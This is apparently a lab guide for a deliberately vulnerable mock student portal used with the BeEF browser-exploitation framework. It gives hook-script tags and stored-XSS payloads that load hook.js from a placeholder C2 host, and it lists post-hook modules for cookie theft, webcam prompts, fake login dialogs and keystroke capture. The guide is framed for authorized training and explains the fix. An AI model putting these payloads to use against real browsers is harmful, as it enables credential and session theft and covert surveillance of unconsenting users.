# Lab Setup — myNorthgate + BeEF

Two separate things, often confused:

| Piece | What it does |
|---|---|
| **BeEF** | Command-and-control server for hooked browsers. Doesn't inject anything on its own. |
| **The host page** | What delivers `hook.js` to the target browser. BeEF assumes you already solved this part. |

This project ships **two** ways to deliver the hook:

1. **Hard-coded hook tag** (default) — the `<script src=".../hook.js">` is baked into `index.html` and `booth.html`. Simplest; demonstrates *what BeEF can do once hooked*, not *how injection works*.
2. **Simulated stored-XSS via the Q&A board** — the board is intentionally built vulnerable: posted question titles/bodies render **unsanitized**, so a post that contains a `<script>` payload executes for anyone who views the thread. Demonstrates *the actual injection step* against your own vulnerable app. No toggle — always on.

Both are legitimate ways to teach the material. **Authorized lab only.** Your own machines/VMs or consented test users.

---

## 1 · Run BeEF (C2 server)

On your BeEF host (substitute `YOUR_BEEF_HOST` in the examples below with
that machine's address):

```bash
sudo apt install beef-xss && sudo beef-xss
# or
git clone https://github.com/beefproject/beef && cd beef && ./install && ./beef
```

Starts and prints:
- **Hook URL:** `http://YOUR_BEEF_HOST:3000/hook.js`
- **Panel URL:** `http://YOUR_BEEF_HOST:3000/ui/panel`

Uncomment the `<script src="http://YOUR_BEEF_HOST:3000/hook.js">` line in
`index.html` and/or `booth.html` and substitute your BeEF host's address.

## 2 · Serve the portal

From the project folder, on any machine the target browser can reach:

```bash
python -m http.server 8000
```

Open `http://<server>:8000` in the test browser.

---

## Demo A — Baseline (hard-coded hook)

The page already contains `<script src=".../hook.js">`, so opening it hooks the browser immediately.

1. Target opens the portal → appears under **Online Browsers** in the BeEF panel.
2. In the panel, select the browser → **Commands** → run modules:
   - *Browser → Hooked Domain → Get Cookie*
   - *Browser → Webcam* (the `booth.html` page is natural cover for this prompt)
   - *Social Engineering → Pretty Theft* (fake login dialog; the myPortal panel reinforces it)
   - **Logs** tab shows typing captured on the hooked page — have the target type into the Q&A ask-form or the myPortal sign-in.

Shows **what a hooked browser lets BeEF do**, but not how the hook got there.

---

## Demo B — Stored XSS → BeEF (your own vulnerable app)

Shows **the actual injection step**, inside an app you own.

1. In the portal, scroll to the **Student Q&A Board**.
2. In the **Ask a question** form, submit a title or body containing a payload, for example:

   ```html
   <script src="http://YOUR_BEEF_HOST:3000/hook.js"></script>
   ```

   or an event-handler payload like:

   ```html
   <img src=x onerror="var s=document.createElement('script');s.src='http://YOUR_BEEF_HOST:3000/hook.js';document.body.appendChild(s)">
   ```

3. The payload becomes a question on the board. **Any browser that views the board** now runs the script → appears in BeEF's **Online Browsers**.

Why this is a real demo and not a trick: the page's render path is doing exactly what a *vulnerable* backend would do — concatenating user content into HTML without escaping. The fix a real app would ship is to escape before rendering, or use `textContent` instead of `innerHTML`.

---

## Gotchas

- **BeEF must be reachable** from the target browser (same network, no firewall on port 3000). If BeEF is down, the hook tag still exists but it just 404s / times out — the page then paints slowly because the `<script>` is blocking.
- **CSP / CORS** aren't configured here, so the inline injection "just works." A real site that sets a strict `Content-Security-Policy` would block the external script even if an XSS existed.
- **Hook URL** lives in `index.html` and `booth.html` (commented out by default). Replace `YOUR_BEEF_HOST` with your BeEF machine's IP or hostname.
- **Scope**: this is for an isolated lab. Don't point anything at browsers whose owners haven't consented.
